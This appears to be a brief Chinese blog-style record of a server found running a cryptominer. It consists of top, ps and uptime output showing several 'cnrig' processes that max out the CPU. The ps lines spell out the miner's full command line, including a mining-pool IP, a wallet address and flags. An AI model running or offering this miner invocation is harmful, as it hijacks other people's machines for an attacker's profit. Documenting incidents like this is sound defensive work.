# 记一次被挖矿

```
[root@hl tmp]# top
top - 09:56:29 up 29 days, 20:47,  4 users,  load average: 96.61, 96.79, 96.79
Tasks: 530 total,   1 running, 529 sleeping,   0 stopped,   0 zombie
%Cpu(s): 99.3 us,  0.7 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem : 13176443+total,  1525340 free, 48863452 used, 81375632 buff/cache
KiB Swap:        0 total,        0 free,        0 used. 81065032 avail Mem 

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                                              
  770 HwHiAiU+  20   0 4882144   4.6g   2056 S 242.3  3.7 189669:14 cnrig                                                                                                                
 9375 HwHiAiU+  20   0 4728380   4.5g   2056 S 215.4  3.6  22581:33 cnrig                                                                                                                
15413 HwHiAiU+  20   0 4728512   4.5g   2056 S 215.4  3.6  22547:59 cnrig                                                                                                                
15414 HwHiAiU+  20   0 4728508   4.5g   2056 S 215.4  3.6  22550:02 cnrig                                                                                                                
26479 HwHiAiU+  20   0 4790024   4.5g   2056 S 192.3  3.6  68386:18 cnrig                                                                                                                
17785 HwHiAiU+  20   0 4943540   4.7g   2056 S 188.5  3.7 259641:55 cnrig      
```

```
[root@hl tmp]# ps -ef|grep cnrig
HwHiAiU+   770     1 99 Nov08 ?        131-17:08:04 ./cnrig -o 94.130.12.27:80 -u 84kGKA9ehor2p2EeEogxnTeBm2kJi9DUP6uMHnohQmhqDZN3LNQxSVv2cZ5fLaFVaJK1c9rEnBuEbCWhN2kQVnFJ9KSk2wk -p voltage -B
HwHiAiU+  9375     1 99 Nov25 ?        15-16:20:23 ./cnrig -o 94.130.12.27:80 -u 84kGKA9ehor2p2EeEogxnTeBm2kJi9DUP6uMHnohQmhqDZN3LNQxSVv2cZ5fLaFVaJK1c9rEnBuEbCWhN2kQVnFJ9KSk2wk -p voltage -B
HwHiAiU+ 15413     1 99 Nov25 ?        15-15:46:49 ./cnrig -o 94.130.12.27:80 -u 84kGKA9ehor2p2EeEogxnTeBm2kJi9DUP6uMHnohQmhqDZN3LNQxSVv2cZ5fLaFVaJK1c9rEnBuEbCWhN2kQVnFJ9KSk2wk -p voltage -B
HwHiAiU+ 15414     1 99 Nov25 ?        15-15:48:52 ./cnrig -o 94.130.12.27:80 -u 84kGKA9ehor2p2EeEogxnTeBm2kJi9DUP6uMHnohQmhqDZN3LNQxSVv2cZ5fLaFVaJK1c9rEnBuEbCWhN2kQVnFJ9KSk2wk -p voltage -B
HwHiAiU+ 17785     1 99 Nov05 ?        180-07:20:45 ./cnrig -o 94.130.12.27:80 -u 84kGKA9ehor2p2EeEogxnTeBm2kJi9DUP6uMHnohQmhqDZN3LNQxSVv2cZ5fLaFVaJK1c9rEnBuEbCWhN2kQVnFJ9KSk2wk -p voltage -B
root     20375  3809  0 09:56 pts/0    00:00:00 grep --color=auto cnrig
HwHiAiU+ 26479     1 99 Nov19 ?        47-11:45:08 ./cnrig -o 94.130.12.27:80 -u 84kGKA9ehor2p2EeEogxnTeBm2kJi9DUP6uMHnohQmhqDZN3LNQxSVv2cZ5fLaFVaJK1c9rEnBuEbCWhN2kQVnFJ9KSk2wk -p voltage -B
```

```
[root@hl tmp]# uptime
 09:56:43 up 29 days, 20:47,  4 users,  load average: 96.83, 96.83, 96.81
```

